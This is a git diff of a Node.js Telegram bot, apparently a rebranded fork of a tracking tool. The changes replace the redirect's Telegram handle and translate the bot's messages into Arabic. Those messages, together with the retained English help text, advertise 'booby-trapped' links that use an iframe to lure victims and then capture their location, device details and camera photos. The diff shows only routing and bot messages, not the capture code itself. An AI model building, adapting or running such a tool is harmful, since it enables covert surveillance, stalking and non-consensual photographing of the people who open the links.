@@ -15,7 +15,7 @@ app.set("view engine", "ejs");
 
 //Modify your URL here
 var hostURL="YOUR URL";
-//TOGGLE for Shorters
+//TOGGLE for 1pt Proxy and Shorters
 var use1pt=true;
 
 
@@ -30,7 +30,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/mosLord777");
 }
 
          
@@ -48,7 +48,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/mosLord777");
 }
 
          
@@ -62,21 +62,21 @@ const chatId = msg.chat.id;
 
  
 
-if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
+if(msg?.reply_to_message?.text=="🌐 ارسل رابط"){
  createLink(chatId,msg.text); 
 }
   
 if(msg.text=="/start"){
 var m={
-reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
+reply_markup:JSON.stringify({"inline_keyboard":[[{text:"انشاء رابط ملغم",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `اهلا ${msg.chat.first_name} ! , \nفي بوت تصوير الضحيه وسحب موقعه 🌐 ومعلومات هاتفه عن طريق رابط ☠️👿.\n.\n\n SEVEN EYES.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
 }
-else if(msg.text=="/help"){
+else if(msg.text=="/elp"){
 bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
 to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
 the url it will send you 2 links which you can use to track people.
@@ -137,15 +137,15 @@ for(var c in y){
 g+=y[c]+"\n";
 }
   
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
+bot.sendMessage(cid, `تم انشاء الروابط الملغمه.\nرابط: ${msg}\n\n✅الروابط\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
 }
 else{
 
-bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
+bot.sendMessage(cid, `تم انشاء الروابط الملغمه.\nرابط 2: ${msg}\n\n✅الروابط\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
 }
 }
 else{
-bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
+bot.sendMessage(cid,`⚠️ يرجي ارسال لينك اخر , لأن هذا اللينك غير مسموح.`);
 createNew(cid);
 
 }  
@@ -156,7 +156,7 @@ function createNew(cid){
 var mk={
 reply_markup:JSON.stringify({"force_reply":true})
 };
-bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
+bot.sendMessage(cid,`🌐 ارسل رابط`,mk);
 }
 
 
